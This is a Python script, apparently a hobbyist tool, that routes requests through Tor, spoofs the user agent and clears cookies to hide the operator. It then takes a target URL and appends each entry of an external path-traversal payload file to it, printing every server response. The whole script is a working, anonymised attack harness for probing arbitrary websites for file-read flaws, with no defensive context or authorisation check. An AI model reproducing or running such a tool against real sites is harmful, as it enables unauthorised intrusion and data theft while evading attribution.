import requests
import time

#setting up an empty session
session = requests.session()
session.proxies = {}

#way to access DO NOT USE requests use session like this:
#r = session.get('https://jasonrigden.com')

#leak test
#it works, trust me
#r = session.get("https://dnsleaktest.com/")
#print("Leak test:\n",r.text)


#check current IP
r = session.get("http://httpbin.org/ip")
print("The following is your REAL IP:\n", r.text, "\n")

#I create a new Session Object and add my proxies
#in order to change IP
session = requests.session()
session.proxies = {}

session.proxies["http"] = "socks5h://localhost:9050"
session.proxies["https"] = "socks5h://localhost:9050"

r = session.get("http://httpbin.org/ip")
print("The following is your NEW IP:\n", r.text, "\n")
#if it doesn't work just restart tor using: sudo service tor restart

#current user agent
#it will show versions info, that we are accesing through python script
r = session.get("https://httpbin.org/user-agent")
print("Current User Agent:\n",r.text)

#we must createw some request headers and change the User-agent
headers = {}
headers['User-agent'] = "HotJava/1.1.2 FCS"
#we include the headers in the request
r = session.get("https://httpbin.org/user-agent", headers=headers)
print("New user agent:\n", r.text)

#we now must kill the cookies!!!!
#first I check them
session.get('http://httpbin.org/cookies/set/sessioncookie/Hello')
r = session.get("http://httpbin.org/cookies")
print("My cookies:\n",r.text)

#KILL EM!!!!!!

session.cookies.clear()
r = session.get("http://httpbin.org/cookies")
print("My NEW cookies:\n",r.text)

#leak test
#it works, trust me
#r = session.get("https://dnsleaktest.com/")
#print("Leak test:\n",r.text)


print("ALL SETTED UP FOR YOU :)\n\n")

url_input = input("Enter URL:\t")

with open ("pathtraversal_cheatsheet") as f:
    cheet_sheet = f.readlines()

for cheet in cheet_sheet:
    url=url_input+cheet
    print("Trying with:\t", url, "\n")
    r = session.get(url)
    print("--------------------------OUTPUT:\n", r.text)
    exit = input("Continue?\t")
    if (exit!="Y" and exit!="Yes" and exit!="yes" and exit!="y"):
        print("The end!\n")
        break

print("BYE")
